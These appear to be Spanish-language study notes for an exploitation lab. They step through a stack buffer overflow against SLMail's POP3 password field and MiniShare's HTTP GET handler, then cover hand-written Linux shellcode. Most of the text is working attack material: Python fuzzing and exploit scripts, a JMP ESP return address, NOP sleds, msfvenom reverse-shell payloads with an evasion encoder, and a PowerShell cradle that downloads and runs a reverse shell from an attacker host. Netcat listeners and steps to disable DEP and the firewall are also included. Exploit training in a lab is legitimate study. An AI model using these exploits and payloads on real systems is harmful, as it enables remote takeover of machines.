
-----
>Una vuln de buffer overflow sucede cuándo un **programa intenta almacenar más datos de los que soporta en un búfer**(memoria aleatoria temporal) pal excederlo, los datos se escriben en posiciones cercanas.

>Se suele dar por **confiar en el input de un usuario** o **utilizar funciones vulnerables**

### Laboratorio
----
- [Win7 home Premium x32](https://windows-7-home-premium.uptodown.com/windows)
- [**Immunity Debugger**](https://www.softpedia.com/get/Programming/Debuggers-Decompilers-Dissasemblers/Immunity-Debugger.shtml?form=MG0AV3)
- [ **mona.py**](https://raw.githubusercontent.com/corelan/mona/master/mona.py) (Para que sea más cómodo crearemos un archiovo .**py** en `C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands`, después en Inmunity Debuger ponemos en la barra de abajo `!mona`)
-  [SLMail](https://slmail.software.informer.com/download/)
- **Deshabilitar DEP** que es un control hardware y software que ayuda a proteger el sistema **contra vulns de code maliciosas** `bcdedit.exe /set <current> nx AlwaysOff`
- Deshabilitar Firewall

----
## Fase inicial de Fuzzing y tomando el control del registro EIP

>Trataremos de petar la memoria del programa **SLMAIL** una vez comprometida la máquina necesitamos **elevar privilegios**

1. File
2. Attach
3. SLmail

>**ESP** es la pila. el stack, recordar que **EIP** es la posición de memoria donde se va a ejecutar la siguiente instrucción del programa

>Intentaremos desbordad el búfer que almacena el campo password el prohrama **SMAIL**, con Inmuniti Debugger, cuándo ejecutemos los scripts si el programa se pausa es que lo habremos roto.

- Se lo enchufamos al **campo vulnerable passd** y con **IDebugger** vemos que cadena hay en **EIP**

>Script para ver donde crashea, pasándole muchas **"AAAA"**

```python
#!/usr/bin/python3

import socket
import sys

# Verificar que se pase el argumento correcto
if len(sys.argv) != 2:
    print("\n[!] Usage: exploit.py <length>")
    exit(1)  

# Variables globales
ip_address = "192.168.1.145"
port = 110
total_length = int(sys.argv[1])

def exploit():
    # Crear un socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Conectar al servidor
    s.connect((ip_address, port))

    # Recibir el banner
    banner = s.recv(1024)

    # Enviar comandos
    s.send(b"USER jquerito" + b'\r\n')
    response = s.recv(1024)
    s.send(b"PASS " + b"A"*total_length + b'\r\n')
    s.close()

# Función principal
if __name__ == '__main__':
    exploit()
```

>Script para saber exactamente en qué carácter podemos meter nuestro payload

 - Caracteres arbitrarios como lo que hicimos con **gdb-peda**
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
```


```python
#!/usr/bin/python3

import socket
import sys

# Variables globales
ip_address = "192.168.1.145"
port = 110

payload = b'lo que nos da /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000'

def exploit():
    # Crear un socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Conectar al servidor
    s.connect((ip_address, port))

    # Recibir el banner
    banner = s.recv(1024)

    # Enviar comandos
    s.send(b"USER jquerito" + b'\r\n')
    response = s.recv(1024)
    s.send(b"PASS " + payload  + b'\r\n')
    s.close()

# Función principal
if __name__ == '__main__':
    exploit()
```

>Después de ejecutar IDebugger nos da una posición de memoria en el **EIP**--> 7A46317A
- Calculamos el offset, que es el total de junk con "AAAA" que rellenamos en el campo **passwd** y justo después le pasaremos nuestra instrucción jiji
```bash
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x7A46317A
[*] Exact match at offset 4654
```

- Simplemente nos aseguramos con este script de que en el **EIP** salen 4 "BBBB"
```python
#!/usr/bin/python3

import socket
import sys

# Variables globales
ip_address = "192.168.1.145"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = b"B"*4
payload = before_eip + eip


def exploit():
    # Crear un socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Conectar al servidor
    s.connect((ip_address, port))

    # Recibir el banner
    banner = s.recv(1024)

    # Enviar comandos
    s.send(b"USER jquerito" + b'\r\n')
    response = s.recv(1024)
    s.send(b"PASS " + payload  + b'\r\n')
    s.close()

# Función principal
if __name__ == '__main__':
    exploit()
```

- Después de sobrescribir el **EIP**, intentamos escribir en la pila **(ESP)** que es un registro de programa que escribe en ella
```python
#!/usr/bin/python3

import socket
import sys

# Variables globales
ip_address = "192.168.1.145"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = b"B"*4
after_eip = b"C"*200

payload = before_eip + eip + after_eip


def exploit():
    # Crear un socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Conectar al servidor
    s.connect((ip_address, port))

    # Recibir el banner
    banner = s.recv(1024)

    # Enviar comandos
    s.send(b"USER jquerito" + b'\r\n')
    response = s.recv(1024)
    s.send(b"PASS " + payload  + b'\r\n')
    s.close()

# Función principal
if __name__ == '__main__':
    exploit()
```

## Generación de Bytearrays y detección de Badchars

>El programa puede que no interprete algunos cracteres que se les considerará badchars maliciosos, debemos jugar con ello con bytearrays que son **shellcodes en orden para saber a simplevista si el programa se saltan alguno**

>Esto lo vemos con IDebugger , **click derecho en los bytes de memoria en ESP , Follow in dump**

#Importante

>El que carácter que no aparezca es que es un badchar

```IMGdebugger
!mona config -set workingfolder C:\dondesees
#Nos da todas las combinaciones posibles
!mona bytearray
#Quitar caracter que el debugger no representa
#Porque el programa no lo interpreta
#También podemos quitárselo desde msfvenom
!mona bytearray -cpb 'x00' 
```

- Creo un samba compartido para pasar los files del win al lin
```bash
impacket-smbserver smbfolder $(pwd) -smb2support
```

```python
#!/usr/bin/python3

import socket
import sys

# Variables globales
ip_address = "192.168.1.145"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = b"B"*4
after_eip = (b"salida de los bytearray.txt con b en cada uno"
b"0x54"
b"0x49")

payload = before_eip + eip + after_eip


def exploit():
    # Crear un socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Conectar al servidor
    s.connect((ip_address, port))

    # Recibir el banner
    banner = s.recv(1024)

    # Enviar comandos
    s.send(b"USER jquerito" + b'\r\n')
    response = s.recv(1024)
    s.send(b"PASS " + payload  + b'\r\n')
    s.close()

# Función principal
if __name__ == '__main__':
    exploit()
```

- Compara los bytearrays con ESP y vemos cuáles son los **badchars**
```MONA
!mona compare -a bytesdememoriaESP -f C:\Users\dondehemoscreadoanteselBytearray.bin


!mona bytearray -cpb '\x00\x0a'
```

## Búsqueda de OpCodes para entrar al ESP y cargar nuestro Shellcode

> Creamos shellcode con **msfvenom** excluyendo los bytes que hemos detectado con **mona**

- Emplearemos un encoder polimórfico(encodea varias veces con fin de evadir defender)
1. **-f** es de formato
2. **EXITFUNC** Si ganamos acceso, crea un proceso hijo y mata el hilo padre, para que una vez salga de la consola siga estando operativo y tengamos persistencia

>msfvenom

- Tenemos que apuntar a una dirección que directamente ejecute un salto al **ESP**, buscando una instrucción  de tipo **JUMP ESP**

```bash
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=ipAtacante LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread
```

``` python
#!/usr/bin/python3

import socket
import sys

# Variables globales
ip_address = input("Introduce ua dirección IP: ")
port = 110
offset = 4654

before_eip = b"A"*offset
eip = b"B"*4

shellcode = (b"lo que te da msfvenom"
b"0x54"
b"0x49")

payload = before_eip + eip + shellcode


def exploit():
    # Crear un socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Conectar al servidor
    s.connect((ip_address, port))

    # Recibir el banner
    banner = s.recv(1024)

    # Enviar comandos
    s.send(b"USER jquerito" + b'\r\n')
    response = s.recv(1024)
    s.send(b"PASS " + payload  + b'\r\n')
    s.close()

# Función principal
if __name__ == '__main__':
    exploit()
```

- Averiguamos el **JUMP ESP**
```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp ESP
00000000 FFE4
nasm > \xFF\xE4
```

- Buscanos el módulo .dll o cualquier otro que tenga los 4 primeros valores en **False**
```bash
!mona modules --> encontramos SLMFC.dll
```

- Cogemos dirección que no tenga badchars
```bash
!mona find -s '\xFF\xE4' -m SLMFC.dll
o probar
!mona findwild -s "JMP ESP"
```

- Si estamos en 32bits tiene que estar al revés, por eso le aplicamos **Little Endian** importamos **from struct import pack**
- Poner la dirección que nos da **!mona** en minúsculas
```python
#!/usr/bin/python3

from struct import pack
import socket
import sys

# Variables globales
ip_address = input("Introduce ua dirección IP: ")
port = 110
offset = 4654

before_eip = b"A"*offset
eip = pack("<L", 0x5f4c4d13) # Lo que nos da el anterior comando de mona

shellcode = (b"lo que te da msfvenom"
b"0x54"
b"0x49")

payload = before_eip + eip + shellcode


def exploit():
    # Crear un socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Conectar al servidor
    s.connect((ip_address, port))

    # Recibir el banner
    banner = s.recv(1024)

    # Enviar comandos
    s.send(b"USER jquerito" + b'\r\n')
    response = s.recv(1024)
    s.send(b"PASS " + payload  + b'\r\n')
    s.close()

# Función principal
if __name__ == '__main__':
    exploit()
```

-  Vamos a IDebugger 
1. buscamos la posición de memoria que nos ha dado el comando de !**mona** en la **flecha azul**
2. Breakpoint --> Toggle, vemos si es verdad que el ESP le da el valor a EIP
3. Mandamos script
4. Debe valer lo **mismo EIP y Jump ESP**
5. Pulsamos **2 botones a la derecha del play** y representa la siguiente instrucción donde **EIP** va a valer lo que antes valía **ESP**
6. Click derecho en **ESP** --> follow in dump
7. Nuestro shellcode se ve reflejado en LA ventana de la izquierda abajo
8. Pero posiblemente no se  ejecute, vemos en la siguuiente sección por qué

## Uso de NOPs, desplazamientos en pila e interpretación del Shellcode para lograr RCE

>Puede que nuestro shellcode no se ejecute porque tarda más tiempo en ejecutarse del que el procesador tiene asignado para ejecutar esa instrucción, para ello utilizamos **NOPS**

>NOPs es --> No Operación, no realiza nada pero permite dar tiempo al programa para que no se ejecute el shellcode antes de que no se ejecute la siguiente instrucción

>**Desplazamiento en la pila**: técnia que implica modificar o mover  el registro ESP para reservar espacio adicional y enchufar el shellcode, podemos utilizar “**sub esp, 0x10**” para desplazar el registro ESP **16 bytes** hacia abajo en la pila y reservar espacio adicional para el shellcode.

- **0x10** son **16 bytes en hexadecimal**

```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > sup ESP, 0x10
83EC10
nasm > \x83\xEC\x10 
```
- Añadimos la variable nops para darle tiempo a que se ejecute el shellcode
```python
#!/usr/bin/python3

from struct import pack
import socket
import sys

# Variables globales
ip_address = input("Introduce ua dirección IP: ")
port = 110
offset = 4654

before_eip = b"A"*offset
eip = pack("<L", 0x5f4c4d13) # La Dirección de una dll sin restricciones
nops = b"\x90"*30
#Si no funciona nops desplazamientopila = b"\x83\xEC\x10"
shellcode = (b"lo que te da msfvenom"
b"0x54"
b"0x49")

payload = before_eip + eip + nops + shellcode


def exploit():
    # Crear un socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Conectar al servidor
    s.connect((ip_address, port))

    # Recibir el banner
    banner = s.recv(1024)

    # Enviar comandos
    s.send(b"USER jquerito" + b'\r\n')
    response = s.recv(1024)
    s.send(b"PASS " + payload  + b'\r\n')
    s.close()

# Función principal
if __name__ == '__main__':
    exploit()
```

- Reverse shell
```bash
rlwrap nc -lnvp 443
```
- En este punto ya hemos realizaedo el buffer overflow
## Modificación del Shellcode para controlar el comando que se desea ejecutar


>**Si hay algún binario que tenga demasiados badchars** (lo que hay en -b que el binario a reventar no acepta como instrucción), le quitamos -e x86/shikata_ga_nai y msfvenom se las apaña para encontrar el encoder que no tenga todos esos badchars

- Utilizamos [Invoke-PowershellTCP](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
>Este binario declara una vez ejecutado lo que es Invoke-PowershellTCP y después podremos ejecutar lo que hay dentro del script

```bash
mv Invoke-PowerShellTcp.ps1 PS.ps1
nano PS.ps1
#Ponemos en la última línea
Invoke-PowerShellTcp -Reverse -IPAddress IPAtacante -Port portAtacante
```

>Cargamos una instrucción en Powershell

```bash
msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://ipatacante:puertoatacante/PS.ps1')" --platform windows -a x86  -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread
```

- Y terminamos ejecutando el mismo script que en el ejercicio anterior pero cambiando el **shellcode**
- Abrimos **Http server**
```bash
python3 -m http.server
```
- Abrimos **Listener**
```bash
rlwrap nc -lnvp 443
```

## Entrenar un poquito ahí lo aprendido

- [Binario vulnerable](https://sourceforge.net/projects/minishare/files/OldFiles/minishare-1.4.1.exe/download) --> **Minishare**

- Sabemos que tiene una vuln por el puerto **80** en el que mandando una petición GET, donde v la url si ponemos demasiada info se acontecerá esto

- De momento tengo esto que peta pero no sé dónde
```python
#!/usr/bin/python3

#Importo librerías necesarias

import sys
import socket
from struct import pack  

#Declaro variabes necesarias
ip_address = input("Introduce la dirección IP del servidor: ")
port = int(input("Introduce el puerto del servidor: "))

# Función donde van las instrucciones del shellcode

def texploto():
    bytes = 200
    while True:
        try:
            # Defino socket, establezco conexión, espero por cada cxonex 6 secs, mando petición GET, recibo 1204 bytes de datos y cierro, en cuánto esto no pase será probable que el programa pete
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(6)
            s.connect((ip_address, port))
            print("[+] Conexión establecida.")
            s.send(b"GET " + b"A"*bytes + b" HTTP/1.1\r\n\r\n")
            s.recv(1024)
            s.close()
            bytes += 200
            print("[+] Enviando %d bytes al servidor..." % bytes)
        except Exception as e:
            print("[+] El servicio petó con %d bytes " % bytes)
            sys.exit(1)

# funcion principal

if __name__ == '__main__':
    texploto()
```

```output
[+] Enviando 1800 bytes al servidor...
[+] Conexión establecida.
[+] El servicio petó con 1800 bytes 
```

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q  0x36684335
[*] Exact match at offset 1787
```


```python
#!/usr/bin/python3

#Importo librerías necesarias
import sys
import socket
from struct import pack
 

#Declaro variabes necesarias
ip_address = input("Introduce la dirección IP del servidor: ")
port = int(input("Introduce el puerto del servidor: "))

# Función donde van las instrucciones del shellcode

def texploto():
    offset = 1787
    antes_eip = b"A"*offset
    eip = b"B"*4
    payload = antes_eip + eip + b"C"*500  

    while True:
        try:
            # Defino socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(7)
            s.connect((ip_address, port))
            print("[+] Conexión establecida.")
            s.send(b"GET " + payload + b" HTTP/1.1\r\n\r\n")
            s.recv(1024)
            s.close()
            print("[+] Enviando bytes al servidor...")
        except Exception as e:
            print("[+] El servicio la palmó")
            sys.exit(1)

# funcion principal

if __name__ == '__main__':

    texploto()
```


- bytearray

!mona compare -a 0x038438D0 -f C:\aqui\bytearray.bin
!mona compare -a bytesdememoriaESP -f C:\Users\dondehemoscreadoanteselBytearray.bin




- shellcode
```bash
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=ipAtacante LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00\x0d' EXITFUNC=thread
```

```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
jmp ESP
# También
!mona modules
!mona findwild -s "JMP ESP"
```

- Ponemos OpCode y Nops
```bash
ops = pack("<L", 0xloquenosdaElUltimo command que no lleve badchars en minúscula)
anteseip + eip + ops + b"\x90*16" + shellcode
```

## Creando shellcode

> Son pequeños programas para llevar a cabo explotaciones, creadas mayoritariamente en **lenguaje ensamblador**

> Crearé un binario para  trabajar con el

```bash
msfvenom -p linux/x86/exec CMD="echo 'Hola mundo'" -f elf -o binariot
```

- Las cadenas están puestas al revés por estar en **little endian**, en **32 bits**
```bash
msfvenom -p linux/x86/exec CMD="echo 'Hola mundo'" -f raw |  xxd
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 53 bytes

00000000: 6a0b 5899 5266 682d 6389 e768 2f73 6800  j.X.Rfh-c..h/sh.
00000010: 682f 6269 6e89 e352 e812 0000 0065 6368  h/bin..R.....ech
00000020: 6f20 2748 6f6c 6120 6d75 6e64 6f27 0057  o 'Hola mundo'.W
00000030: 5389 e1cd 80                             S....
                                                        
```

- Así lo vemos en ensamblador
```bash
msfvenom -p linux/x86/exec CMD="echo 'Hola mundo'" -f raw | ndisasm -b32 -
```

- **0X80** Significa interrumpir

- Te da las traducciones del lenguaje ``/usr/include/asm-generic/unistd.h

>Vamos a crear un poquito de ensamblador hombre, esos programas van con extensión **.asm**

- Crearemos un **holamundo**, tendremos que poner  lo que sale en hexadecimal de cada palabra al revés
- Por ejemplo del "do" de "Hola Mundo"
```bash
echo -n "do" | xxd -ps
646f
```
```asm
section .text
	global _start

_start:

	mov eax, 4 ; sys_write
	
	;write(int fd, const void *buf, size_t count); Esto es lo que hay em unistd.h
	
	mov ebx, 1 ; stdout
	push 0x0a6f64 ; do --> el 0a es un salto de línea
	push 0x6e756d20 ; mun
	push 0x616c6f48 ; Hola
	mov ecx, esp ; puntero a la cadena
	mov edx, 11 ; longitud de la cadena
	
	int 80h ; Interrupción
	
	; sys_exit --> para decirle al eip que ya no tiene que apuntar a ningunamemory position
	mov eax, 1 ; exit
	xor ebx, ebx ; exit(0)
	
	int 80h
```

>Ahora lo desensamblamos uqe es lo que hace **msfvenom**, aunque lo cifra y lo encodea para operar sigilosamente

```bash
printf '\\x' && objdump -d final | grep "^ " | cut -f2 | tr -d ' '| tr -d '\n' | sed 's/. {2\}/&\\x /g' | head -c-3 | tr -d ' '; echo
xb8\x04x00x00x00\xbbx01x00x00x00x68\x64x6fx0ax00x68x20x6d\x75x6e\x68\x48\x6f\x6c\x61\x89\xe1\xba\x0bx00x00x00xcd\x80\xb8x01\x00x00\x00\x31\xdb\xcd\x80
```

- Crearemos una **/bin/sh**
```asm
section .text
	global start

_start:

	mov eax, 11 ; sys_execve
	push 0x0 ; Terminación de la cadena
	push 0x68732f2f ; "//sh"
	push 0x6e69622f ; "/bin"
	
	mov ebx, esp
	xor ecx, ecx ; ecx -> 0
	xor edx, edx ; edc -> 0
	
	int 80h : Interrupción
```

>Creamos ejecutable final, le decimos como queremos que se interprete y el **code.o** es el programa que había previamente
```bash
nasm -f elf code.asm
ld -m elf_i386 -o finalbash code.o
./finalbash
```

```bash
printf '\\x' && objdump -d finalbash | grep "^ " | cut -f2 | tr -d ' '| tr -d '\n' | sed 's/. {2\}/&\\x /g' | head -c-3 | tr -d ' '; echo
```